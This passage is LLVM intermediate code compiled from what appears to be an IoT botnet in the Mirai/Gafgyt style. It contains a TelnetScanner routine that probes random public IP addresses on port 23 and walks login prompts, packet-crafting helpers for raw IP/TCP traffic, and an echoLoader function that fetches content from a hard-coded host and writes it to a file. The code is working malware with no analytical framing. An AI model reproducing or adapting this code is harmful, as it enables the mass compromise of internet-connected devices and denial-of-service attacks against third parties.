  %.09.lcssa = phi i32 [ %1, %2 ], [ %32, %._crit_edge17.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa26, %._crit_edge17.loopexit ]
  %33 = icmp eq i32 %.09.lcssa, 1
  br i1 %33, label %34, label %.preheader

; <label>:34:                                     ; preds = %._crit_edge17
  %35 = bitcast i16* %.010.lcssa to i8*
  %36 = load i8, i8* %35, align 1
  %37 = zext i8 %36 to i64
  %38 = add i64 %37, %.0.lcssa
  br label %.preheader

.preheader:                                       ; preds = %34, %._crit_edge17
  %.1.ph = phi i64 [ %.0.lcssa, %._crit_edge17 ], [ %38, %34 ]
  %39 = lshr i64 %.1.ph, 16
  %40 = icmp eq i64 %39, 0
  br i1 %40, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %41 = phi i64 [ %44, %.lr.ph ], [ %39, %.lr.ph.preheader ]
  %.111 = phi i64 [ %43, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %42 = and i64 %.111, 65535
  %43 = add nuw nsw i64 %42, %41
  %44 = lshr i64 %43, 16
  %45 = icmp eq i64 %44, 0
  br i1 %45, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.1.lcssa = phi i64 [ %.1.ph, %.preheader ], [ %43, %._crit_edge.loopexit ]
  %46 = trunc i64 %.1.lcssa to i16
  %47 = xor i16 %46, -1
  ret i16 %47
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr* nocapture readonly, %struct.tcphdr* nocapture readonly) local_unnamed_addr #1 {
  %3 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %4 = load i32, i32* %3, align 4
  %5 = zext i32 %4 to i64
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  %7 = load i32, i32* %6, align 4
  %8 = zext i32 %7 to i64
  %9 = tail call zeroext i16 @htons(i16 zeroext 20) #18
  %10 = tail call noalias i8* @malloc(i64 44) #3
  %11 = bitcast i8* %10 to i16*
  %.sroa.0.0..sroa_cast = bitcast i8* %10 to i64*
  store i64 %5, i64* %.sroa.0.0..sroa_cast, align 1
  %.sroa.2.0..sroa_idx6 = getelementptr inbounds i8, i8* %10, i64 8
  %.sroa.2.0..sroa_cast = bitcast i8* %.sroa.2.0..sroa_idx6 to i64*
  store i64 %8, i64* %.sroa.2.0..sroa_cast, align 1
  %.sroa.3.0..sroa_idx = getelementptr inbounds i8, i8* %10, i64 16
  store i8 0, i8* %.sroa.3.0..sroa_idx, align 1
  %.sroa.4.0..sroa_raw_idx = getelementptr inbounds i8, i8* %10, i64 17
  store i8 6, i8* %.sroa.4.0..sroa_raw_idx, align 1
  %.sroa.5.0..sroa_idx7 = getelementptr inbounds i8, i8* %10, i64 18
  %12 = bitcast i8* %.sroa.5.0..sroa_idx7 to i16*
  store i16 %9, i16* %12, align 1
  %13 = getelementptr inbounds i8, i8* %10, i64 24
  %14 = bitcast %struct.tcphdr* %1 to i8*
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %13, i8* %14, i64 20, i32 1, i1 false)
  %15 = tail call zeroext i16 @csum(i16* %11, i32 44)
  tail call void @free(i8* %10) #3
  ret i16 %15
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #6

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeIPPacket(%struct.iphdr* nocapture, i32, i32, i8 zeroext, i32) local_unnamed_addr #0 {
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 0
  store i8 69, i8* %6, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 1
  store i8 0, i8* %7, align 1
  %8 = trunc i32 %4 to i16
  %9 = add i16 %8, 20
  %10 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 2
  store i16 %9, i16* %10, align 2
  %11 = tail call i32 @rand_cmwc()
  %12 = trunc i32 %11 to i16
  %13 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 3
  store i16 %12, i16* %13, align 4
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 4
  store i16 0, i16* %14, align 2
  %15 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 5
  store i8 -1, i8* %15, align 4
  %16 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  store i8 %3, i8* %16, align 1
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 7
  store i16 0, i16* %17, align 2
  %18 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  store i32 %2, i32* %18, align 4
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  store i32 %1, i32* %19, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) local_unnamed_addr #1 {
  %2 = icmp slt i32 %0, 3
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %1
  %4 = tail call i32 @close(i32 %0) #3
  br label %5

; <label>:5:                                      ; preds = %1, %3
  %.0 = phi i32 [ 0, %3 ], [ 1, %1 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) local_unnamed_addr #1 {
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  store i32 1, i32* %4, align 4
  %5 = tail call %struct.hostent* @gethostbyname(i8* %0) #3
  %6 = icmp eq %struct.hostent* %5, null
  br i1 %6, label %7, label %8

; <label>:7:                                      ; preds = %2
  tail call void @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.47, i64 0, i64 0)) #3
  tail call void @exit(i32 1) #17
  unreachable

; <label>:8:                                      ; preds = %2
  %9 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 4
  %10 = load i8**, i8*** %9, align 8
  %11 = load i8*, i8** %10, align 8
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2
  %13 = bitcast %struct.in_addr* %12 to i8*
  %14 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 3
  %15 = load i32, i32* %14, align 4
  %16 = sext i32 %15 to i64
  call void @bcopy(i8* %11, i8* %13, i64 %16) #3
  %17 = tail call zeroext i16 @htons(i16 zeroext %1) #18
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  store i16 %17, i16* %18, align 2
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  store i16 2, i16* %19, align 4
  %20 = tail call i32 @socket(i32 2, i32 1, i32 6) #3
  %21 = bitcast i32* %4 to i8*
  %22 = call i32 @setsockopt(i32 %20, i32 6, i32 1, i8* nonnull %21, i32 4) #3
  %23 = icmp eq i32 %20, -1
  br i1 %23, label %24, label %25

; <label>:24:                                     ; preds = %8
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.48, i64 0, i64 0)) #19
  call void @exit(i32 1) #17
  unreachable

; <label>:25:                                     ; preds = %8
  %26 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %27 = call i32 @connect(i32 %20, %struct.sockaddr* nonnull %26, i32 16) #3
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %25
  call void @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.49, i64 0, i64 0)) #19
  call void @exit(i32 1) #17
  unreachable

; <label>:30:                                     ; preds = %25
  ret i32 %20
}

declare %struct.hostent* @gethostbyname(i8*) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @herror(i8*) local_unnamed_addr #5

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #12

; Function Attrs: nounwind
declare void @bcopy(i8* nocapture readonly, i8* nocapture, i64) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare void @perror(i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @echoLoader() local_unnamed_addr #1 {
  %1 = alloca [512 x i8], align 16
  %2 = tail call i32 @socket_connect(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.50, i64 0, i64 0), i16 zeroext 80)
  %3 = tail call i64 @write(i32 %2, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.51, i64 0, i64 0), i64 13) #3
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %4, i8 0, i64 512, i32 16, i1 false)
  %5 = call i64 @read(i32 %2, i8* nonnull %4, i64 511) #3
  %6 = icmp eq i64 %5, 0
  br i1 %6, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %0
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %7 = tail call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.52, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.53, i64 0, i64 0))
  %fputs = call i32 @fputs(i8* nonnull %4, %struct._IO_FILE* %7)
  %8 = tail call i32 @fclose(%struct._IO_FILE* %7)
  call void @llvm.memset.p0i8.i64(i8* nonnull %4, i8 0, i64 512, i32 16, i1 false)
  %9 = call i64 @read(i32 %2, i8* nonnull %4, i64 511) #3
  %10 = icmp eq i64 %9, 0
  br i1 %10, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %0
  %11 = tail call i32 @shutdown(i32 %2, i32 2) #3
  %12 = tail call i32 @close(i32 %2) #3
  ret void
}

; Function Attrs: nounwind
declare noalias %struct._IO_FILE* @fopen(i8* nocapture readonly, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @fclose(%struct._IO_FILE* nocapture) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @shutdown(i32, i32) local_unnamed_addr #5

; Function Attrs: noinline noreturn nounwind uwtable
define void @TelnetScanner() local_unnamed_addr #13 {
  %1 = alloca %struct.__sigset_t, align 8
  %2 = alloca %struct.timeval, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca %struct.timeval, align 8
  %7 = tail call i32 @getdtablesize() #3
  %8 = sdiv i32 %7, 4
  %9 = mul nsw i32 %8, 3
  %10 = icmp slt i32 %9, 512
  %11 = select i1 %10, i32 %9, i32 512
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %12, align 4
  %13 = tail call zeroext i16 @htons(i16 zeroext 23) #18
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %13, i16* %14, align 2
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %16 = bitcast i8* %15 to i64*
  store i64 0, i64* %16, align 4
  %17 = zext i32 %11 to i64
  %18 = alloca %struct.telstate_t, i64 %17, align 16
  %19 = bitcast %struct.telstate_t* %18 to i8*
  %20 = sext i32 %11 to i64
  %21 = mul nsw i64 %20, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %19, i8 0, i64 %21, i32 16, i1 false)
  %22 = icmp sgt i32 %7, 3
  br i1 %22, label %.lr.ph341.preheader, label %._crit_edge

.lr.ph341.preheader:                              ; preds = %0
  %23 = sext i32 %11 to i64
  br label %.lr.ph341

.lr.ph341:                                        ; preds = %.lr.ph341.preheader, %.lr.ph341
  %indvars.iv = phi i64 [ 0, %.lr.ph341.preheader ], [ %indvars.iv.next, %.lr.ph341 ]
  %24 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %indvars.iv, i32 3
  store i8 1, i8* %24, align 1
  %25 = tail call noalias i8* @malloc(i64 1024) #3
  %26 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %indvars.iv, i32 8
  store i8* %25, i8** %26, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %25, i8 0, i64 1024, i32 1, i1 false)
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %27 = icmp slt i64 %indvars.iv.next, %23
  br i1 %27, label %.lr.ph341, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph341
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %0
  %28 = tail call i32 @system(i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.55, i64 0, i64 0)) #3
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 0
  store i64 5, i64* %29, align 8
  %30 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 1
  store i64 0, i64* %30, align 8
  %31 = icmp sgt i32 %7, 3
  %32 = bitcast %struct.timeval* %6 to i8*
  %33 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %1, i64 0, i32 0, i64 0
  %34 = getelementptr inbounds %struct.timeval, %struct.timeval* %2, i64 0, i32 1
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit, %._crit_edge
  br i1 %31, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %36 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %37 = getelementptr inbounds %struct.timeval, %struct.timeval* %2, i64 0, i32 0
  %38 = bitcast i32* %4 to i8*
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %744
  %.1339 = phi i32 [ %.mux, %744 ], [ 0, %.lr.ph.preheader ]
  %39 = sext i32 %.1339 to i64
  %40 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39
  %41 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 2
  %42 = load i8, i8* %41, align 8
  switch i8 %42, label %744 [
    i8 0, label %43
    i8 1, label %95
    i8 2, label %146
    i8 3, label %239
    i8 4, label %262
    i8 5, label %370
    i8 6, label %393
    i8 7, label %583
    i8 8, label %593
    i8 9, label %603
    i8 10, label %628
    i8 11, label %632
    i8 12, label %642
  ]

; <label>:43:                                     ; preds = %.lr.ph
  %44 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 8
  %45 = load i8*, i8** %44, align 8
  call void @llvm.memset.p0i8.i64(i8* %45, i8 0, i64 1024, i32 1, i1 false)
  %46 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  %47 = load i8, i8* %46, align 1
  %48 = icmp eq i8 %47, 0
  br i1 %48, label %55, label %49

; <label>:49:                                     ; preds = %43
  %50 = bitcast i8** %44 to i64*
  %51 = load i64, i64* %50, align 8
  %52 = bitcast %struct.telstate_t* %40 to i8*
  call void @llvm.memset.p0i8.i64(i8* %52, i8 0, i64 32, i32 16, i1 false)
  store i64 %51, i64* %50, align 8
  %53 = call i32 @getRandomPublicIP()
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 1
  store i32 %53, i32* %54, align 4
  br label %69

; <label>:55:                                     ; preds = %43
  %56 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 5
  %57 = load i8, i8* %56, align 1
  %58 = add i8 %57, 1
  store i8 %58, i8* %56, align 1
  %59 = icmp eq i8 %58, 13
  br i1 %59, label %60, label %64

; <label>:60:                                     ; preds = %55
  store i8 0, i8* %56, align 1
  %61 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 4
  %62 = load i8, i8* %61, align 2
  %63 = add i8 %62, 1
  store i8 %63, i8* %61, align 2
  br label %64

; <label>:64:                                     ; preds = %60, %55
  %65 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 4
  %66 = load i8, i8* %65, align 2
  %67 = icmp eq i8 %66, 4
  br i1 %67, label %68, label %69

; <label>:68:                                     ; preds = %64
  store i8 1, i8* %46, align 1
  br label %744

; <label>:69:                                     ; preds = %64, %49
  store i16 2, i16* %12, align 4
  store i16 %13, i16* %14, align 2
  store i64 0, i64* %16, align 4
  %70 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 1
  %71 = load i32, i32* %70, align 4
  store i32 %71, i32* %35, align 4
  %72 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %73 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %40, i64 0, i32 0
  store i32 %72, i32* %73, align 16
  %74 = call i32 @setsockopt(i32 %72, i32 1, i32 20, i8* nonnull %32, i32 16) #3
  %75 = load i32, i32* %73, align 16
  %76 = call i32 @setsockopt(i32 %75, i32 1, i32 21, i8* nonnull %32, i32 16) #3
  %77 = load i32, i32* %73, align 16
  %78 = icmp eq i32 %77, -1
  br i1 %78, label %744, label %79

; <label>:79:                                     ; preds = %69
  %80 = call i32 (i32, i32, ...) @fcntl(i32 %77, i32 3, i8* null) #3
  %81 = or i32 %80, 2048
  %82 = call i32 (i32, i32, ...) @fcntl(i32 %77, i32 4, i32 %81) #3
  %83 = load i32, i32* %73, align 16
  %84 = call i32 @connect(i32 %83, %struct.sockaddr* nonnull %36, i32 16) #3
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %93

; <label>:86:                                     ; preds = %79
  %87 = tail call i32* @__errno_location() #18
  %88 = load i32, i32* %87, align 4
  %89 = icmp eq i32 %88, 115
  br i1 %89, label %93, label %90

; <label>:90:                                     ; preds = %86
  %91 = load i32, i32* %73, align 16
  %92 = call i32 @sclose(i32 %91)
  store i8 1, i8* %46, align 1
  br label %744

; <label>:93:                                     ; preds = %86, %79
  store i8 1, i8* %41, align 8
  %94 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 6
  store i32 0, i32* %94, align 4
  br label %744

; <label>:95:                                     ; preds = %.lr.ph
  %96 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 6
  %97 = load i32, i32* %96, align 4
  %98 = icmp eq i32 %97, 0
  br i1 %98, label %99, label %102

; <label>:99:                                     ; preds = %95
  %100 = call i64 @time(i64* null) #3
  %101 = trunc i64 %100 to i32
  store i32 %101, i32* %96, align 4
  br label %102

; <label>:102:                                    ; preds = %95, %99
  %103 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %33) #3, !srcloc !6
  %104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %40, i64 0, i32 0
  %105 = load i32, i32* %104, align 16
  %106 = srem i32 %105, 64
  %107 = zext i32 %106 to i64
  %108 = shl i64 1, %107
  %109 = sdiv i32 %105, 64
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %1, i64 0, i32 0, i64 %110
  %112 = load i64, i64* %111, align 8
  %113 = or i64 %108, %112
  store i64 %113, i64* %111, align 8
  store i64 0, i64* %37, align 8
  store i64 10000, i64* %34, align 8
  %114 = load i32, i32* %104, align 16
  %115 = add nsw i32 %114, 1
  %116 = call i32 @select(i32 %115, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %1, %struct.__sigset_t* null, %struct.timeval* nonnull %2) #3
  switch i32 %116, label %136 [
    i32 1, label %117
    i32 -1, label %132
  ]

; <label>:117:                                    ; preds = %102
  store i32 4, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %118 = load i32, i32* %104, align 16
  %119 = call i32 @getsockopt(i32 %118, i32 1, i32 4, i8* nonnull %38, i32* nonnull %3) #3
  %120 = load i32, i32* %4, align 4
  %121 = icmp eq i32 %120, 0
  %122 = load i32, i32* %104, align 16
  br i1 %121, label %125, label %123

; <label>:123:                                    ; preds = %117
  %124 = call i32 @sclose(i32 %122)
  br label %.sink.split

; <label>:125:                                    ; preds = %117
  %126 = call i32 (i32, i32, ...) @fcntl(i32 %122, i32 3, i8* null) #3
  %127 = and i32 %126, -2049
  %128 = call i32 (i32, i32, ...) @fcntl(i32 %122, i32 4, i32 %127) #3
  store i32 0, i32* %96, align 4
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 7
  store i16 0, i16* %129, align 16
  %130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 8
  %131 = load i8*, i8** %130, align 8
  call void @llvm.memset.p0i8.i64(i8* %131, i8 0, i64 1024, i32 1, i1 false)
  store i8 2, i8* %41, align 8
  br label %744

; <label>:132:                                    ; preds = %102
  %133 = load i32, i32* %104, align 16
  %134 = call i32 @sclose(i32 %133)
  br label %.sink.split

.sink.split:                                      ; preds = %123, %132
  store i8 0, i8* %41, align 8
  %135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 1, i8* %135, align 1
  br label %136

; <label>:136:                                    ; preds = %102, %.sink.split
  %137 = load i32, i32* %96, align 4
  %138 = add i32 %137, 10
  %139 = zext i32 %138 to i64
  %140 = call i64 @time(i64* null) #3
  %141 = icmp slt i64 %139, %140
  br i1 %141, label %142, label %744

; <label>:142:                                    ; preds = %136
  %143 = load i32, i32* %104, align 16
  %144 = call i32 @sclose(i32 %143)
  store i8 0, i8* %41, align 8
  %145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 1, i8* %145, align 1
  br label %744

; <label>:146:                                    ; preds = %.lr.ph
  %147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 6
  %148 = load i32, i32* %147, align 4
  %149 = icmp eq i32 %148, 0
  br i1 %149, label %150, label %153

; <label>:150:                                    ; preds = %146
  %151 = call i64 @time(i64* null) #3
  %152 = trunc i64 %151 to i32
  store i32 %152, i32* %147, align 4
  br label %153

; <label>:153:                                    ; preds = %150, %146
  %154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %40, i64 0, i32 0
  %155 = load i32, i32* %154, align 16
  %156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 8
  %157 = load i8*, i8** %156, align 8
  %158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 7
  %159 = load i16, i16* %158, align 16
  %160 = zext i16 %159 to i32
  %161 = call i32 @readUntil(i32 %155, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %157, i32 1024, i32 %160)
  %162 = icmp eq i32 %161, 0
  br i1 %162, label %170, label %163

; <label>:163:                                    ; preds = %153
  store i32 0, i32* %147, align 4
  store i16 0, i16* %158, align 16
  %164 = load i8*, i8** %156, align 8
  %165 = call i8* @strstr(i8* %164, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i64 0, i64 0)) #15
  %166 = icmp eq i8* %165, null
  br i1 %166, label %168, label %167

; <label>:167:                                    ; preds = %163
  store i8 5, i8* %41, align 8
  br label %169

; <label>:168:                                    ; preds = %163
  call void @llvm.memset.p0i8.i64(i8* %164, i8 0, i64 1024, i32 1, i1 false)
  br label %169

; <label>:169:                                    ; preds = %168, %167
  store i8 3, i8* %41, align 8
  br label %744

; <label>:170:                                    ; preds = %153
  %171 = load i32, i32* %154, align 16
  %172 = load i8*, i8** %156, align 8
  %173 = load i16, i16* %158, align 16
  %174 = zext i16 %173 to i32
  %175 = call i32 @readUntil(i32 %171, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %172, i32 1024, i32 %174)
  %176 = icmp eq i32 %175, 0
  br i1 %176, label %184, label %177

; <label>:177:                                    ; preds = %170
  store i32 0, i32* %147, align 4
  store i16 0, i16* %158, align 16
  %178 = load i8*, i8** %156, align 8
  %179 = call i8* @strstr(i8* %178, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i64 0, i64 0)) #15
  %180 = icmp eq i8* %179, null
  br i1 %180, label %182, label %181

; <label>:181:                                    ; preds = %177
  store i8 5, i8* %41, align 8
  br label %183

; <label>:182:                                    ; preds = %177
  call void @llvm.memset.p0i8.i64(i8* %178, i8 0, i64 1024, i32 1, i1 false)
  br label %183

; <label>:183:                                    ; preds = %182, %181
  store i8 3, i8* %41, align 8
  br label %744

; <label>:184:                                    ; preds = %170
  %185 = load i32, i32* %154, align 16
  %186 = load i8*, i8** %156, align 8
  %187 = load i16, i16* %158, align 16
  %188 = zext i16 %187 to i32
  %189 = call i32 @readUntil(i32 %185, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.59, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %186, i32 1024, i32 %188)
  %190 = icmp eq i32 %189, 0
  br i1 %190, label %198, label %191

; <label>:191:                                    ; preds = %184
  store i32 0, i32* %147, align 4
  store i16 0, i16* %158, align 16
  %192 = load i8*, i8** %156, align 8
  %193 = call i8* @strstr(i8* %192, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i64 0, i64 0)) #15
  %194 = icmp eq i8* %193, null
  br i1 %194, label %196, label %195

; <label>:195:                                    ; preds = %191
  store i8 5, i8* %41, align 8
  br label %197

; <label>:196:                                    ; preds = %191
  call void @llvm.memset.p0i8.i64(i8* %192, i8 0, i64 1024, i32 1, i1 false)
  br label %197

; <label>:197:                                    ; preds = %196, %195
  store i8 3, i8* %41, align 8
  br label %744

; <label>:198:                                    ; preds = %184
  %199 = load i32, i32* %154, align 16
  %200 = load i8*, i8** %156, align 8
  %201 = load i16, i16* %158, align 16
  %202 = zext i16 %201 to i32
  %203 = call i32 @readUntil(i32 %199, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %200, i32 1024, i32 %202)
  %204 = icmp eq i32 %203, 0
  br i1 %204, label %212, label %205

; <label>:205:                                    ; preds = %198
  store i32 0, i32* %147, align 4
  store i16 0, i16* %158, align 16
  %206 = load i8*, i8** %156, align 8
  %207 = call i8* @strstr(i8* %206, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i64 0, i64 0)) #15
  %208 = icmp eq i8* %207, null
  br i1 %208, label %210, label %209

; <label>:209:                                    ; preds = %205
  store i8 5, i8* %41, align 8
  br label %211

; <label>:210:                                    ; preds = %205
  call void @llvm.memset.p0i8.i64(i8* %206, i8 0, i64 1024, i32 1, i1 false)
  br label %211

; <label>:211:                                    ; preds = %210, %209
  store i8 3, i8* %41, align 8
  br label %744

; <label>:212:                                    ; preds = %198
  %213 = load i32, i32* %154, align 16
  %214 = load i8*, i8** %156, align 8
  %215 = load i16, i16* %158, align 16
  %216 = zext i16 %215 to i32
  %217 = call i32 @readUntil(i32 %213, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %214, i32 1024, i32 %216)
  %218 = icmp eq i32 %217, 0
  br i1 %218, label %226, label %219

; <label>:219:                                    ; preds = %212
  store i32 0, i32* %147, align 4
  store i16 0, i16* %158, align 16
  %220 = load i8*, i8** %156, align 8
  %221 = call i8* @strstr(i8* %220, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i64 0, i64 0)) #15
  %222 = icmp eq i8* %221, null
  br i1 %222, label %224, label %223

; <label>:223:                                    ; preds = %219
  store i8 5, i8* %41, align 8
  br label %225

; <label>:224:                                    ; preds = %219
  call void @llvm.memset.p0i8.i64(i8* %220, i8 0, i64 1024, i32 1, i1 false)
  br label %225

; <label>:225:                                    ; preds = %224, %223
  store i8 3, i8* %41, align 8
  br label %744

; <label>:226:                                    ; preds = %212
  %227 = load i8*, i8** %156, align 8
  %228 = call i64 @strlen(i8* %227) #15
  %229 = trunc i64 %228 to i16
  store i16 %229, i16* %158, align 16
  %230 = load i32, i32* %147, align 4
  %231 = add i32 %230, 10
  %232 = zext i32 %231 to i64
  %233 = call i64 @time(i64* null) #3
  %234 = icmp slt i64 %232, %233
  br i1 %234, label %235, label %744

; <label>:235:                                    ; preds = %226
  %236 = load i32, i32* %154, align 16
  %237 = call i32 @sclose(i32 %236)
  store i8 0, i8* %41, align 8
  %238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 1, i8* %238, align 1
  br label %744

; <label>:239:                                    ; preds = %.lr.ph
  %240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %40, i64 0, i32 0
  %241 = load i32, i32* %240, align 16
  %242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 4
  %243 = load i8, i8* %242, align 2
  %244 = zext i8 %243 to i64
